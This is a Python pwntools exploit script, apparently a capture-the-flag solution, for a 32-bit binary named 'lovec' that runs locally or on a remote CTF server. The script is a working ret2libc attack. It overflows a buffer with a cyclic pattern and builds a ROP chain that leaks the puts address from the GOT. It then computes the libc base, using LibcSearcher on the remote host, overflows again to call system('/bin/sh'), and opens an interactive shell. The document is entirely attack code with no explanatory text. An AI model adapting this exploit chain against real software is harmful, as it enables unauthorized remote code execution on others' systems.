
from pwn import *
from LibcSearcher import LibcSearcher
import sys

def info(leak,LIBC_BASE,ADDR_SYSTEM,ADDR_BINSH):
    print()
    log.info('puts address       :' + hex(leak))
    log.info('Libc base address  :' + hex(LIBC_BASE))
    log.info('System address     :' + hex(ADDR_SYSTEM))
    log.info('/bin/sh address    :' + hex(ADDR_BINSH))
    print()

if len(sys.argv) == 1:
    # Lical
    r = process('./lovec')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
else:
    # Remote 
    r = remote('bamboofox.cs.nctu.edu.tw', 11003)
    libc = ELF('./libc.so.6', checksec=False)

elf = ELF('./lovec', checksec=False)

pop_ebx = 0x080483b9 #: pop ebx; ret;

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_off = libc.sym['puts']
main = 0x08048588

r.recvuntil('name:')
p = b'A' + b'\x00' + b'\xff' * 19
r.send(p)
r.recvuntil('10. C')
r.sendline(b'4')
r.recvuntil('like it?')

p = cyclic(41)
p += p32(puts_plt)
p += p32(pop_ebx)
p += p32(puts_got)
p += p32(main)

r.sendline(p)

r.readline()
r.readline()
leak = u32(r.readline()[:4])

if len(sys.argv) == 1:
    LIBC_BASE = leak - puts_off
    ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
    ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE
    info(leak,LIBC_BASE,ADDR_SYSTEM,ADDR_BINSH)
else:
    libc = LibcSearcher('puts',leak)
    LIBC_BASE = leak-libc.dump('puts')
    ADDR_SYSTEM = LIBC_BASE + libc.dump('system')
    ADDR_BINSH = LIBC_BASE + libc.dump('str_bin_sh')
    info(leak,LIBC_BASE,ADDR_SYSTEM,ADDR_BINSH)

r.recvuntil('name:')
p = b'A' + b'\x00' + b'\xff' * 19
r.send(p)
r.recvuntil('10. C')
r.sendline(b'4')
r.recvuntil('like it?')

p = cyclic(41)
p += p32(ADDR_SYSTEM)
p += p32(0x0)
p += p32(ADDR_BINSH)

r.sendline(p)

r.interactive()
